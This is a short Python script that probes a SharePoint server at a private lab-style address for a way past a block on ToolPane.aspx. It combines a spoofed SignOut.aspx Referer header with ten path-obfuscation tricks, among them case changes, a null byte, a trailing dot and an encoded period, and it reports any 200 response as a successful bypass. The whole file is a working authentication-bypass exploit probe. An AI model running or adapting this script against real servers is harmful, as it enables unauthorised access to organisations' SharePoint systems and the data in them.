import requests

base_url = "http://10.10.10.166"
headers = {"User-Agent": "Mozilla/5.0", "Referer": "/_layouts/SignOut.aspx"}

# Try to bypass the ToolPane.aspx specific block
toolpane_bypass_tests = [
    ("Original", "/_layouts/15/ToolPane.aspx"),
    ("Case variation", "/_layouts/15/ToolPane.ASPX"),  # OrdinalIgnoreCase
    ("With path info", "/_layouts/15/ToolPane.aspx/test"),
    ("With query", "/_layouts/15/ToolPane.aspx?test=1"),
    ("With fragment", "/_layouts/15/ToolPane.aspx#test"),
    ("Double extension", "/_layouts/15/ToolPane.aspx.aspx"),
    ("URL encode period", "/_layouts/15/ToolPane%2Easpx"),
    ("Trailing space", "/_layouts/15/ToolPane.aspx "),
    ("Trailing dot", "/_layouts/15/ToolPane.aspx."),
    ("Null byte", "/_layouts/15/ToolPane.aspx%00"),
]

print("Attempting to bypass ToolPane.aspx block...")
for name, path in toolpane_bypass_tests:
    try:
        resp = requests.get(base_url + path, headers=headers, timeout=10)
        if resp.status_code == 200:
            print(f"✓✓ [{name}] BYPASS SUCCESSFUL! Status: {resp.status_code}")
        elif resp.status_code == 401:
            print(f"✗ [{name}] Blocked (401)")
        else:
            print(f"? [{name}] Status: {resp.status_code}")
    except Exception as e:
        print(f"✗ [{name}] Error: {str(e)[:40]}")
